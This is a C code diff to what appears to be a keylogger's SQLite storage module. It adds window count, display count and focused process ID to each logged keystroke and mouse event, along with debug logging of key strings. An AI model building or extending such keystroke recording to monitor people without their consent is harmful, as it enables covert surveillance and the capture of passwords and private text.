@@ -1,11 +1,32 @@
+#include "window-utils-test.h"
+#define DEFAULT_WINDOW_NAME_PATTERN    "kitty"
+#ifndef LOGLEVEL
+#define LOGLEVEL                       DEFAULT_LOGLEVEL
+#endif
+#include "app-utils.h"
+#include "submodules/greatest/greatest.h"
+#include "submodules/log.h/log.h"
+#include "window-utils.h"
 #define DEBUG_LOGGED_EVENTS    true
 #include "keylogger-db.h"
 #include "log.h/log.h"
 #include <assert.h>
 ////////////////////////////////////////////////////////
-static struct sqldbal_db      *db;
-static volatile unsigned long last_qty_checks = 0, last_qty_check_ts = 0, check_qty_interval_ms = 5000;
-static volatile size_t        recorded_qty = 0, inserted_events_qty = 0, table_size_bytes = 0;
+#include "active-app.h"
+#include "app-utils.h"
+#include "app-utils.h"
+#include "submodules/greatest/greatest.h"
+#include "submodules/log.h/log.h"
+#include "system-utils.h"
+#include "window-utils.h"
+static volatile int focused_pid = 0;
+static volatile int                windows_qty = 0;
+static volatile int                display_qty = 0;
+static volatile struct screen_size ss          = { 0, 0, 0, 0 };
+static struct sqldbal_db           *db;
+static volatile unsigned long      last_qty_checks = 0, last_qty_check_ts = 0, check_qty_interval_ms = 5000;
+static volatile size_t             recorded_qty = 0, inserted_events_qty = 0, table_size_bytes = 0;
+static struct Vector               *pids_v;
 #define ASSERT_SQLDB_RESULT()          \
   { do {                               \
       assert(rc == SQLDBAL_STATUS_OK); \
@@ -55,6 +76,9 @@ CREATE TABLE IF NOT EXISTS events(\
 , mouse_x INTEGER NOT NULL\
 , mouse_y INTEGER NOT NULL\
 , input_type VARCHAR(20) NOT NULL\
+, windows_qty INTEGER NOT NULL\
+, display_qty INTEGER NOT NULL\
+, focused_pid INTEGER NOT NULL\
 )",
                           NULL,
                           NULL);
@@ -164,21 +188,34 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     log_debug("kc:%lu", LOGGED_EVENT->key_code);
     log_debug("ks:%s", LOGGED_EVENT->key_string);
     log_debug("type:%s", LOGGED_EVENT->input_type);
+    log_debug("windows_qty:%d", windows_qty);
+    log_debug("display_qty:%d", display_qty);
+    log_debug("focused_pid:%d", focused_pid);
     log_debug("mouse:%lux%lu", LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y);
+    log_debug("screen size:x:%d,y:%d,w:%d,h:%d", ss.x, ss.y, ss.w, ss.h);
   }
   db_statement_t db_st = NEW_DB_STATEMENT();
   if (((long long)(timestamp() - last_qty_check_ts) > check_qty_interval_ms)) {
     recorded_qty      = keylogger_count_table_rows("events");
     table_size_bytes  = keylogger_get_db_size();
     last_qty_check_ts = timestamp();
+    windows_qty       = GetWindowsQty();
+    ss                = get_window_size();
+    display_qty       = get_display_count();
+    focused_pid       = get_frontmost_application();
+    pids_v            = get_all_processes();
+    //focused_t *fp = get_focused_process();
+    /*
+     * if(fp != NULL)
+     */
   }
 
   for (size_t i = 0; i < LOGGED_EVENT->qty; i++) {
     db_st.rc = sqldbal_stmt_prepare(db,
                                     "INSERT INTO events\
-      (ts, key_code, key_string, action, mouse_x, mouse_y, input_type) \
+      (ts, key_code, key_string, action, mouse_x, mouse_y, input_type, windows_qty, display_qty, focused_pid) \
                                     VALUES\
-      (?, ?, ?, ?, ?, ?, ?)\
+      (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\
 ",
                                     -1,
                                     &db_st.stmt);
@@ -197,6 +234,14 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 6, LOGGED_EVENT->input_type, -1);
     ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 7, windows_qty);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 8, display_qty);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 9, focused_pid);
+    ASSERT_DB_STATEMENT(db_st);
+//    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 7, 123456);
+//  ASSERT_DB_STATEMENT(db_st);
     EXEC_AND_ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_last_insert_id(db, "events_id_seq", &db_st.inserted_id);
     ASSERT_DB_STATEMENT(db_st);
